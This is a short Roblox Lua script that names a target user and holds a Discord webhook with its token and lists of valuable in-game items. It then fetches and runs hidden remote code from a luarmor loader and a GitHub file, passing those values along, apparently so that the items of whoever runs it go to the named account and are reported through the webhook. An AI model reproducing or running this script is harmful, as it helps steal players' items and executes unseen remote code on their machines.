local TARGET_ID = 8601685971
local TARGET_USER = "espadachim22931"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1573520190426054726/lurP2uTnSmyfHkdGVKtFFwPyIJuF_wEVOUgoY_2R6g1ycTozFIX_YWOY_vt_lfTm1_fI"

local TargetBrainrots = {
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Dragon Gingerini"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rico Dinero"] = true,
    ["Rubrikiko"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Foxini Lanternini"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true,
    ["Skeleton Dragon"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/e01d7c5e4edbbdf3f8f74db445854c2d.lua"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)